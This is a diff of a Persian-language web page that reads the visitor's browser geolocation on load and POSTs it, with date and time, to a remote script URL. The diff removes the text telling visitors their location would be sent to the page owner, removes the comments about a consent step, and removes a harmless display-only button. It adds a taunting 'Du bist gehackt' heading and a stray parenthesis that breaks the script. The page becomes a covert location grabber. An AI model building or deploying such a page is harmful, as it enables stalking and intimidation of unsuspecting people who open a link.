@@ -1,25 +1,22 @@
-!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="fa" dir="rtl">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>اشتراک موقعیت مکانی</title>
+  <title>Gehackt</title>
 </head>
 
 <body>
 
-  <h2>اشتراک موقعیت مکانی</h2>
+  <h2>Du bist gehackt(O'~'O)</h2>
 
   <p>
-    موقعیت مکانی شما دریافت می‌شود.
-    سپس از شما برای ارسال آن به صاحب این صفحه اجازه گرفته می‌شود.
+   صبر کن الان میگم بهت
   </p>
 
   <p id="result">در حال آماده‌سازی...</p>
 
   <hr>
-
-  <button onclick="showLocationInfo()">نمایش موقعیت، تاریخ و ساعت</button>
 
   <p id="infoResult"></p>
 
@@ -32,11 +29,11 @@
 
       if (!navigator.geolocation) {
         result.innerText =
-          "مرورگر شما از موقعیت مکانی پشتیبانی نمی‌کند.";
+          "مرورگر شما  پشتیبانی نمی‌کند.";
         return;
       }
 
-      result.innerText = "در حال دریافت موقعیت...";
+      result.innerText = "در حال دریافت ...";
 
       navigator.geolocation.getCurrentPosition(
         function(position) {
@@ -46,7 +43,7 @@
 
         
 
-          result.innerText = "در حال ارسال موقعیت...";
+          result.innerText = "در حال انجام...";
 
           fetch(SCRIPT_URL, {
             method: "POST",
@@ -66,7 +63,7 @@
             const timeStr = now.toLocaleTimeString("fa-IR");
 
             result.innerHTML =
-              "موقعیت با موفقیت ارسال شد.<br><br>" +
+              "<br><br>" +
               "عرض جغرافیایی: " + lat + "<br>" +
               "طول جغرافیایی: " + lon + "<br>" +
               "تاریخ: " + dateStr + "<br>" +
@@ -83,7 +80,7 @@
             console.error("خطا:", error);
 
             result.innerText =
-              "موقعیت دریافت شد، اما ارسال آن ناموفق بود.";
+              " ناموفق بود.";
 
           });
         },
@@ -94,22 +91,22 @@
 
             case error.PERMISSION_DENIED:
               result.innerText =
-                "دسترسی به موقعیت مکانی رد شد.";
+                "دسترسی رد شد.";
               break;
 
             case error.POSITION_UNAVAILABLE:
               result.innerText =
-                "موقعیت مکانی در دسترس نیست.";
+                " در دسترس نیست.";
               break;
 
             case error.TIMEOUT:
               result.innerText =
-                "دریافت موقعیت بیش از حد طول کشید.";
+                "دریافت بیش از حد طول کشید.";
               break;
 
             default:
               result.innerText =
-                "خطای نامشخص در دریافت موقعیت.";
+                "خطای نامشخص در دریافت.";
           }
         },
 
@@ -121,18 +118,17 @@
       );
     }
 
-    // این تابع فقط موقعیت فعلی، تاریخ و ساعت را نمایش می‌دهد
-    // و هیچ داده‌ای به هیچ سروری ارسال نمی‌کند
+    
     function showLocationInfo() {
       const infoResult = document.getElementById("infoResult");
 
       if (!navigator.geolocation) {
         infoResult.innerText =
-          "مرورگر شما از موقعیت مکانی پشتیبانی نمی‌کند.";
+          "مرورگر شما پشتیبانی نمی‌کند.";
         return;
       }
 
-      infoResult.innerText = "در حال دریافت موقعیت...";
+      infoResult.innerText = "در حال دریافت ...";
 
       navigator.geolocation.getCurrentPosition(
         function(position) {
@@ -152,16 +148,16 @@ const now = new Date();
         function(error) {
           switch (error.code) {
             case error.PERMISSION_DENIED:
-              infoResult.innerText = "دسترسی به موقعیت مکانی رد شد.";
+              infoResult.innerText = "دسترسی به رد شد.";
               break;
             case error.POSITION_UNAVAILABLE:
-              infoResult.innerText = "موقعیت مکانی در دسترس نیست.";
+              infoResult.innerText = " در دسترس نیست.";
               break;
             case error.TIMEOUT:
-              infoResult.innerText = "دریافت موقعیت بیش از حد طول کشید.";
+              infoResult.innerText = "دریافت بیش از حد طول کشید.";
               break;
             default:
-              infoResult.innerText = "خطای نامشخص در دریافت موقعیت.";
+              infoResult.innerText = "خطای نامشخص در دریافت .";
           }
         },
 
@@ -173,9 +169,7 @@ const now = new Date();
       );
     }
 
-    // به محض باز شدن لینک، درخواست موقعیت شروع می‌شود
-    // (همچنان: اول مرورگر از کاربر اجازه می‌گیرد، بعد confirm نمایش داده می‌شود،
-    // و فقط با تایید کاربر در آن پنجره، ارسال انجام می‌شود)
+    )
           
           window.addEventListener("DOMContentLoaded", getLocation);
   </script>
